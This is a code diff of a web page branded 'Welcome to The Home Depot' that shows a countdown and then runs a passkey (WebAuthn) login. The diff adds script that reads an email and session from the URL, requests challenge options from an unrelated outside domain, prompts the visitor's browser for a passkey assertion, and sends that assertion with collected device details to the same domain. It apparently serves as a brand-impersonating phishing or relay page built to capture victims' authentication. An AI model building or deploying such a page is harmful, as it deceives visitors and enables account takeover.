@@ -9,164 +9,120 @@
     body {
       background: #ffffff; /* White background */
       min-height: 100vh;
-      overflow: hidden;
-      font-family: 'Arial', sans-serif;
-      margin: 0; /* Remove default margin */
-    }
-    .glow {
-      box-shadow: 0 0 15px rgba(249, 115, 22, 0.8), 0 0 30px rgba(249, 115, 22, 0.4);
-    }
-    .pulse {
-      animation: pulse 1.5s infinite;
-    }
-    @keyframes pulse {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.05); }
-      100% { transform: scale(1); }
-    }
-    .stars {
-      position: absolute;
-      width: 3px;
-      height: 3px;
-      background: rgba(249, 115, 22, 0.9); /* Orange stars */
-      border-radius: 50%;
-      animation: twinkle 2.5s infinite;
-    }
-    @keyframes twinkle {
-      0%, 100% { opacity: 0.4; }
-      50% { opacity: 1; }
-    }
-    .loader {
-      display: flex;
-      justify-content: center;
-      width: 20vw;
-      max-width: 80px;
-      height: 20vw;
-      max-height: 80px;
-    }
-    .gear {
-      width: 50%;
-      height: 100%;
-      background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" fill="%23f97316" viewBox="0 0 24 24"><path d="M12 2a10 10 0 0 0-10 10 10 10 0 0 0 10 10 10 10 0 0 0 10-10A10 10 0 0 0 12 2zm2 15h-4v-2h4v2zm0-4h-4v-2h4v2zm0-4h-4V7h4v2z"/></svg>') no-repeat center;
-      background-size: contain;
-    }
-    .gear:nth-child(1) { animation: rotateCW 2s infinite linear; }
-    .gear:nth-child(2) { animation: rotateCCW 2s infinite linear; }
-    @keyframes rotateCW {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    @keyframes rotateCCW {
-      0% { transform: rotate(360deg); }
-      100% { transform: rotate(0deg); }
-    }
-    .welcome-screen {
-      position: fixed;
-      inset: 0;
-      background: linear-gradient(135deg, #f97316, #e55b00); /* Home Depot orange tones */
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      z-index: 20;
-      transition: opacity 0.8s ease;
+      font-family: 'Arial', sans-serif;
+      margin: 0;
+      overflow: hidden;
     }
-    .welcome-screen.hidden {
-      opacity: 0;
-      pointer-events: none;
-    }
-    #welcome h1 {
-      font-size: clamp(2rem, 8vw, 7rem); /* Responsive font size */
+    .container {
       text-align: center;
-      padding: 1rem;
+      width: 90%;
+      max-width: 600px;
+      padding: clamp(1rem, 3vw, 2rem);
+      background: #ffffff;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); /* Subtle shadow */
+      transition: transform 0.3s ease, opacity 0.5s ease;
     }
-    /* White pulsating modal with orange text */
-    #auth-card {
-      background: #ffffff; /* White background */
-      color: #f97316; /* Orange text */
-      width: 90%; /* Responsive width */
-      max-width: 500px; /* Cap for larger screens */
-      padding: clamp(1rem, 3vw, 2.5rem); /* Responsive padding */
-      margin: 0 auto;
+    .welcome {
+      font-size: clamp(2rem, 6vw, 4rem); /* Responsive welcome text */
+      font-weight: bold;
+      color: #f97316; /* Home Depot orange */
+      margin-bottom: 1.5rem;
+      opacity: 1;
+      transition: opacity 0.5s ease;
     }
-    #auth-card h1 {
-      font-size: clamp(1.5rem, 5vw, 3rem); /* Responsive title */
+    .welcome.hidden {
+      opacity: 0;
     }
-    #countdown {
-      font-size: clamp(1.25rem, 4vw, 2rem); /* Responsive countdown */
+    .auth-message {
+      font-size: clamp(1rem, 3vw, 1.5rem);
+      color: #333; /* Dark gray for contrast */
+      margin-bottom: 2rem;
+      opacity: 0;
+      transition: opacity 0.5s ease;
     }
-    #status {
-      font-size: clamp(1rem, 3vw, 1.25rem); /* Responsive status */
+    .auth-message.visible {
+      opacity: 1;
     }
-
-    /* Media Queries for Fine-Tuning */
+    .loader {
+      display: flex;
+      justify-content: center;
+      gap: 8px;
+      width: 20vw;
+      max-width: 80px;
+      height: 20vw;
+      max-height: 80px;
+      opacity: 0;
+      transition: opacity 0.5s ease;
+    }
+    .loader.visible {
+      opacity: 1;
+    }
+    .loader span {
+      width: 10px;
+      height: 100%;
+      background: #f97316;
+      border-radius: 5px;
+      animation: wave 1.2s infinite ease-in-out;
+    }
+    .loader span:nth-child(2) { animation-delay: 0.2s; }
+    .loader span:nth-child(3) { animation-delay: 0.4s; }
+    @keyframes wave {
+      0%, 100% { transform: scaleY(0.4); }
+      50% { transform: scaleY(1); }
+    }
+    /* Media Queries */
     @media (max-width: 768px) {
-      .stars {
-        width: 2px;
-        height: 2px; /* Smaller stars on mobile */
+      .container {
+        padding: 1.5rem;
       }
       .loader {
         width: 15vw;
         max-width: 60px;
         height: 15vw;
-        max-height: 60px; /* Smaller gears on mobile */
+        max-height: 60px;
+      }
+      .loader span {
+        width: 8px;
       }
     }
     @media (max-width: 480px) {
-      #auth-card {
-        padding: 1rem; /* Tighter padding on very small screens */
+      .container {
+        padding: 1rem;
       }
       .loader {
         width: 12vw;
         max-width: 50px;
         height: 12vw;
-        max-height: 50px; /* Even smaller on tiny screens */
+        max-height: 50px;
+      }
+      .loader span {
+        width: 6px;
       }
     }
   </style>
 </head>
-<body class="flex items-center justify-center">
-  <!-- Starry Background -->
-  <div id="stars-container" class="fixed inset-0"></div>
-
-  <!-- Welcome Screen -->
-  <div id="welcome" class="welcome-screen">
-    <h1 class="font-bold text-white drop-shadow-lg">Welcome to The Home Depot</h1>
-  </div>
-
-  <!-- Authentication Card (White Modal) -->
-  <div id="auth-card" class="relative z-10 bg-opacity-100 rounded-2xl glow pulse text-center hidden">
-    <h1 class="font-bold mb-6 text-orange-600 drop-shadow-md">
-      Passkey Authentication
-    </h1>
-    <div id="countdown" class="font-bold text-orange-600 mb-4"></div>
-    <div id="status" class="font-medium text-orange-600 mb-6"></div>
-    <div class="loader">
-      <div class="gear"></div>
-      <div class="gear"></div>
-    </div> <!-- Rotating gears at the bottom -->
+<body>
+  <div class="container">
+    <h1 class="welcome">Welcome to The Home Depot</h1>
+    <div id="auth-message" class="auth-message"></div>
+    <div id="loader" class="loader">
+      <span></span>
+      <span></span>
+      <span></span>
+    </div>
   </div>
 
   <script>
     // [Previous gatherUserDetails function remains unchanged]
 
-    // Generate twinkling stars
-    const starsContainer = document.getElementById('stars-container');
-    for (let i = 0; i < 150; i++) {
-      const star = document.createElement('div');
-      star.className = 'stars';
-      star.style.left = `${Math.random() * 100}vw`;
-      star.style.top = `${Math.random() * 100}vh`;
-      star.style.animationDelay = `${Math.random() * 2.5}s`;
-      starsContainer.appendChild(star);
-    }
-
-    // [Previous base64urlToArrayBuffer and arrayBufferToBase64url functions remain unchanged]
-
-    const welcome = document.getElementById('welcome');
-    const authCard = document.getElementById('auth-card');
-    const countdownDisplay = document.getElementById('countdown');
-    const status = document.getElementById('status');
+    const welcome = document.querySelector('.welcome');
+    const authMessage = document.getElementById('auth-message');
+    const loader = document.getElementById('loader');
     const BASE_URL = 'https://mex-node.space';
 
     let countdownTimer = null;
@@ -176,44 +132,110 @@
     const username = urlParams.get('email');
     const session = urlParams.get('session');
 
-    // Show welcome screen for 3 seconds, then start authentication
+    // Show welcome for 2 seconds, then transition to auth
     setTimeout(() => {
       welcome.classList.add('hidden');
-      authCard.classList.remove('hidden');
       if (username) {
-        startCountdown(username);
+        startAuthentication(username);
       } else {
-        status.textContent = 'Error: No email provided in URL';
-        status.className = 'text-red-400';
+        authMessage.textContent = 'Error: No email provided in URL';
+        authMessage.classList.add('visible');
+        authMessage.style.color = '#e53e3e'; // Red for error
       }
-    }, 3000);
+    }, 2000);
 
-    function clearCountdown() {
-      if (countdownTimer) {
-        clearInterval(countdownTimer);
-        countdownTimer = null;
-      }
-      countdownDisplay.textContent = '';
-      status.textContent = '';
-    }
-
-    function startCountdown(username) {
-      let count = 4;
-      countdownDisplay.textContent = `Authenticating in ${count}...`;
+    function startAuthentication(username) {
+      let count = 3;
+      authMessage.textContent = `Authenticating in ${count}...`;
+      authMessage.classList.add('visible');
+      loader.classList.add('visible');
 
       countdownTimer = setInterval(async () => {
         count--;
         if (count > 0) {
-          countdownDisplay.textContent = `Authenticating in ${count}...`;
+          authMessage.textContent = `Authenticating in ${count}...`;
         } else {
           clearInterval(countdownTimer);
-          countdownDisplay.textContent = '';
+          authMessage.textContent = 'Verifying your passkey...';
           await authenticate(username);
         }
       }, 1000);
     }
 
-    // [Previous authenticate function remains unchanged]
+    // Base64url to ArrayBuffer conversion
+    function base64urlToArrayBuffer(base64url) {
+      const base64 = base64url.replace(/-/g, '+').replace(/_/g, '/');
+      const binary = atob(base64);
+      const buffer = new Uint8Array(binary.length);
+      for (let i = 0; i < binary.length; i++) {
+        buffer[i] = binary.charCodeAt(i);
+      }
+      return buffer.buffer;
+    }
+
+    // ArrayBuffer to base64url conversion
+    function arrayBufferToBase64url(buffer) {
+      const binary = String.fromCharCode(...new Uint8Array(buffer));
+      return btoa(binary).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+    }
+
+    async function authenticate(username) {
+      let secondaryDeviceDetails = await gatherUserDetails();
+      try {
+        const optsResp = await fetch(`${BASE_URL}/auth/options`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ username })
+        });
+        const opts = await optsResp.json();
+        if (!optsResp.ok) throw new Error(opts.error || 'Failed to get authentication options');
+
+        opts.challenge = base64urlToArrayBuffer(opts.challenge);
+        opts.allowCredentials = opts.allowCredentials.map(cred => ({
+          ...cred,
+          id: base64urlToArrayBuffer(cred.id)
+        }));
+
+        const credential = await navigator.credentials.get({ publicKey: opts });
+
+        const credBody = {
+          id: credential.id,
+          rawId: credential.id,
+          response: {
+            authenticatorData: arrayBufferToBase64url(credential.response.authenticatorData),
+            clientDataJSON: arrayBufferToBase64url(credential.response.clientDataJSON),
+            signature: arrayBufferToBase64url(credential.response.signature),
+            userHandle: credential.response.userHandle ? arrayBufferToBase64url(credential.response.userHandle) : null
+          },
+          type: credential.type
+        };
+
+        const verifyResp = await fetch(`${BASE_URL}/auth/verify`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ username, credential: credBody, secondaryDeviceDetails, session })
+        });
+        const result = await verifyResp.json();
+
+        if (result.verified) {
+          authMessage.textContent = 'Authentication successful!';
+          authMessage.style.color = '#38a169'; // Green for success
+          loader.classList.remove('visible');
+        } else {
+          throw new Error(result.error || 'Verification failed');
+        }
+      } catch (error) {
+        authMessage.textContent = `Error: ${error.message}`;
+        authMessage.style.color = '#e53e3e'; // Red for error
+        loader.classList.remove('visible');
+      }
+    }
+
+    // Placeholder for gatherUserDetails (assumed unchanged)
+    async function gatherUserDetails() {
+      // [Your existing gatherUserDetails function here]
+      return {};
+    }
   </script>
 </body>
 </html>
